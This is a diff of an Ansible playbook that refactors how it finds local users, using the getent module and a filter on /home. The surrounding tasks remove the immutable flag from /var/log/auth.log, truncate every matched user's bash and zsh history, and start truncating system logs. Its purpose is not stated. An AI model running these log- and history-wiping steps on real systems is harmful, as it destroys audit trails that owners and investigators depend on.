@@ -2,18 +2,24 @@
 - name: Unset immutable attribute
   command: "chattr -i /var/log/auth.log"
 
-- name: Get all local users with a home directory
-  ansible.builtin.shell: "getent passwd | awk -F: '$6 ~ /^\/home/ {print $1, $6}'"
-  register: local_users
-  changed_when: false
+- name: Get all passwd entries
+  ansible.builtin.getent:
+    database: passwd
+
+- name: Filter users with home directories in /home
+  set_fact:
+    home_users: >-
+      {{
+        getent_passwd | dict2items 
+        | selectattr('value.4', 'match', '^/home') 
+        | list
+      }}
 
 - name: Clear shell history for all users
   ansible.builtin.shell: |
-    truncate -s 0 {{ item.split()[1] }}/.bash_history
-    truncate -s 0 {{ item.split()[1] }}/.zsh_history
-  args:
-    removes: "{{ item.split()[1] }}/.bash_history"
-  loop: "{{ local_users.stdout_lines }}"
+    truncate -s 0 {{ item.value.4 }}/.bash_history
+    truncate -s 0 {{ item.value.4 }}/.zsh_history
+  loop: "{{ home_users }}"
   failed_when: false
 
 - name: Truncate system logs
